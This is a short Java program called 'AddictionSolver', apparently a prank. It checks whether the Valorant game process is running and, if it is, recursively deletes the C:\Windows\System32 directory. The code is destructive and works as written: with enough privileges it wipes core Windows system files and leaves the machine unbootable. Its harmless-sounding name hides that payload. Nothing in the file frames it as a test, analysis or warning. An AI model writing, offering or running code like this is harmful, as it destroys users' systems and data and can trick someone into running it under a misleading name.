import java.io.File;
import java.io.IOException;
import java.util.Scanner;

public class AddictionSolver {
    public static void main(String[] args) {
        String processName = "VALORANT-Win64-Shipping.exe";  // process to check for
        String directoryPath = "C:\\Windows\\System32";  // directory to delete

        if (isProcessRunning(processName)) {
            System.out.println(processName + " is running.");
            File directory = new File(directoryPath);

            if (directory.exists() && directory.isDirectory()) {
                if (deleteDirectory(directory)) {
                    System.out.println("Directory deleted: " + directoryPath);
                } else {
                    System.out.println("Failed to delete directory.");
                }
            } else {
                System.out.println("Directory not found: " + directoryPath);
            }
        } else {
            System.out.println(processName + " is not running.");
        }
    }

    // Checks if a process is running (Windows only)
    private static boolean isProcessRunning(String processName) {
        try {
            Process process = Runtime.getRuntime().exec("tasklist");
            Scanner scanner = new Scanner(process.getInputStream());

            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                if (line.toLowerCase().contains(processName.toLowerCase())) {
                    scanner.close();
                    return true;
                }
            }

            scanner.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    // Recursively deletes a directory
    private static boolean deleteDirectory(File dir) {
        File[] allContents = dir.listFiles();
        if (allContents != null) {
            for (File file : allContents) {
                deleteDirectory(file);
            }
        }
        return dir.delete();
    }
}
